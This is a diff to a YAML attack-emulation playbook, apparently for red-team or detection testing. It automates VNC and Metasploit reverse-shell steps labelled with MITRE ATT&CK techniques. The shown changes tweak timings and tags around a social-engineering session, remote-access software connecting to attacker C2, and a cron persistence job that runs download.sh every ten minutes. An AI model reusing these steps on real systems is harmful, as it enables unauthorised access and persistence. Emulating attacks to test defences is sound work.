@@ -83,7 +83,7 @@ commands:
     port: 5902
     creates_session: social_engineering
 
-# Opening a terminal from the menu
+  # Opening a terminal from the menu
 
   - type: vnc
     cmd: move
@@ -147,6 +147,10 @@ commands:
     cmd: key
     key: "enter"
     session: social_engineering
+    metadata:
+      techniques: "T1204.001,T1105,T1566.004"
+      tactics: "Initial Access,Execution,Command and Control"
+      technique_name: "User Execution: Malicious Link,Ingress Tool Transfer,Phishing: Spearphishing Voice"
 
   - type: sleep
     seconds: 45
@@ -324,6 +328,10 @@ commands:
   - type: vnc
     cmd: click
     session: social_engineering
+    metadata:
+      techniques: "T1219" # Configuring Remote Access SW to connect to attacker C2
+      tactics: "Command and Control"
+      technique_name: "Remote Access Software"
 
   - type: sleep
     seconds: 1
@@ -697,7 +705,7 @@ commands:
       technique_name: "Ingress Tool Transfer,Remote Access Software,Hide Artifacts: Hidden Files and Directories"
     
   - type: sleep
-    seconds: 1
+    seconds: 20
 
   - type: vnc
     cmd: key
@@ -722,7 +730,7 @@ commands:
       technique_name: "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification,Remote Access Software"
     
   - type: sleep
-    seconds: 1
+    seconds: 20
 
   - type: vnc
     cmd: key
@@ -734,7 +742,7 @@ commands:
       technique_name: "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification,Remote Access Software"
 
   - type: sleep
-    seconds: 5
+    seconds: 1
 
 #### Persistence OPTION A set up a fake firefox binary that executes the reverse shell and then the actual firefox
 
@@ -911,49 +919,37 @@ commands:
     session: revshell
     cmd: crontab -e
     metadata:
-      techniques: "T1029,T1053.003,T1048.001"
-      tactics: "Persistence, Execution,Exfiltration"
-      technique_name: "Scheduled Transfer,Scheduled Task/Job: Cron,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
+      techniques: "T1053.003"
+      tactics: "Persistence"
+      technique_name: "Scheduled Task/Job: Cron"
 
   - type: msf-session
     session: revshell
     cmd: ":inoremap jj <ESC>"
-    metadata:
-      techniques: "T1029,T1053.003,T1048.001"
-      tactics: "Persistence, Execution,Exfiltration"
-      technique_name: "Scheduled Transfer,Scheduled Task/Job: Cron,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
 
   - type: msf-session
     session: revshell
     cmd: "o"
-    metadata:
-      techniques: "T1029,T1053.003,T1048.001"
-      tactics: "Persistence, Execution,Exfiltration"
-      technique_name: "Scheduled Transfer,Scheduled Task/Job: Cron,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
 
   - type: msf-session
     session: revshell
     cmd: "*/10 * * * * /home/judy/download.sh"
     metadata:
-      techniques: "T1029,T1053.003,T1048.001"
-      tactics: "Persistence, Execution,Exfiltration"
-      technique_name: "Scheduled Transfer,Scheduled Task/Job: Cron,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
+      techniques: "T1053.003"
+      tactics: "Persistence"
+      technique_name: "Scheduled Task/Job: Cron"
 
   - type: msf-session
     session: revshell
     cmd: "jj"
-    metadata:
-      techniques: "T1029,T1053.003,T1048.001"
-      tactics: "Persistence, Execution,Exfiltration"
-      technique_name: "Scheduled Transfer,Scheduled Task/Job: Cron,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
 
   - type: msf-session
     session: revshell
     cmd: ":wq!\n"
     metadata:
-      techniques: "T1029,T1053.003,T1048.001"
-      tactics: "Persistence, Execution,Exfiltration"
-      technique_name: "Scheduled Transfer,Scheduled Task/Job: Cron,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
+      techniques: "T1053.003"
+      tactics: "Persistence"
+      technique_name: "Scheduled Task/Job: Cron"
 
   # find out which windown are open
   - type: msf-session
@@ -978,9 +974,5 @@ commands:
     session: revshell
     cmd: exit
 
-
-  
-
-
-
-  
+  - type: sleep
+    seconds: 30 
